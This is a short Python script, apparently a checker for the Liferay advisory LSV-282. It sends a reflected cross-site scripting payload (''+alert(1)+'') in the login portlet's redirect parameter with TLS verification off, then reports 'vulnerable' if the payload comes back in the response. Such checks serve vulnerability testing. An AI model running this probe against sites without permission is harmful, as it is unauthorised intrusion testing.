import requests
import sys

if (len(sys.argv) != 2):
	sys.stderr.write('Usage: python lsv-282.py [url]')
	sys.exit(-1)

params = {
	'p_p_id': 'com_liferay_login_web_portlet_LoginPortlet',
	'p_p_state': 'maximized',
	'_com_liferay_login_web_portlet_LoginPortlet_redirect': '\'+alert(1)+\''
}

response = requests.get(sys.argv[1], params=params, verify=False, timeout=3)

if '""+alert(1)+""' in response.text:
	sys.stdout.write("vulnerable")